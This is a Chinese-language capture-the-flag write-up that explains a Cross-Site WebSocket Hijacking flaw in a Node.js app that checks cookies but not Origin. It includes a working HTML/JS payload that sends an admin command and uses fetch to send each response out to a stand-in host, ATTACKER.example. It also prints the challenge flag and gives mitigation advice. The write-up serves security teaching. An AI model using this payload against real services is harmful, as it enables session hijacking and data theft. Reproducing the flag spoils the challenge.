# Wembsoncket

## 题目简述

Node.js 应用使用 JWT Cookie 认证 WebSocket。管理员 bot 会携带 `userId: admin` 的 `token` Cookie 访问用户提交的网址；该 Cookie 设置为 `SameSite=None; Secure; HttpOnly`。WebSocket 握手验证 Cookie，却没有检查 `Origin`。管理员连接发送 JSON `{"message":"/getFlag"}` 时，服务会回传 flag。

这构成 Cross-Site WebSocket Hijacking：恶意页面虽不能读取 HttpOnly Cookie，但浏览器仍会在跨站 WebSocket 握手中自动携带它。

## 解题过程

在外部可访问站点托管以下页面。它连接挑战域的 `wss://` 服务，连接建立后发送命令，并把每条响应编码后外带到自己的收集端：

```html
<script>
const ws = new WebSocket("wss://TARGET");

ws.onopen = () => {
  ws.send(JSON.stringify({message: "/getFlag"}));
};

ws.onmessage = (event) => {
  fetch("https://ATTACKER.example/collect?data=" +
        encodeURIComponent(event.data), {mode: "no-cors"});
};
</script>
```

再把该页面 URL 通过普通 WebSocket 发给应用。管理员 bot 预先给挑战域设置管理员 Cookie，然后访问恶意页面。浏览器从恶意源发起挑战域 WebSocket 握手时带上该 Cookie；服务没有验证 `Origin`，所以将连接识别为管理员并返回：

```text
byuctf{CSWSH_1s_a_b1g_acr0nym}
```

生产环境必须使用有效 TLS 证书，否则 `Secure` Cookie 和浏览器的混合内容策略可能阻止这条链。

## 方法总结

- 核心技巧：诱导带特权 Cookie 的 bot 从恶意页面建立跨站 WebSocket，发送管理员命令并外带响应。
- 识别信号：WebSocket 仅验证 Cookie、不校验 `Origin`，同时 Cookie 允许跨站发送且存在 URL bot 时，应考虑 CSWSH。
- 复用要点：服务端对握手的 `Origin` 做严格 allowlist，并对敏感消息增加独立 CSRF/会话绑定；HttpOnly 只能阻止脚本读取 Cookie，不能阻止浏览器发送它。
